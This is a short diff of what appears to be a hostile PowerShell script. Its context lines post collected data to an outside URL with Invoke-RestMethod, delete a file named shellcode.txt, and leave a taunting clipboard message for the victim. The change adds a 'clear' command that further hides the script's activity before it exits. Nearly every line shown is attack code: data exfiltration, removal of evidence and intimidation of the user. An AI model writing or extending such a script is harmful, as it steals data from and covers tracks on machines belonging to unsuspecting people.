@@ -8,4 +8,5 @@ $data
 Invoke-RestMethod -Method Post -Uri $url -Body $data
 Remove-Item -Path shellcode.txt
 Set-Clipboard -Value "Your computer was fucked up!"
+clear
 exit
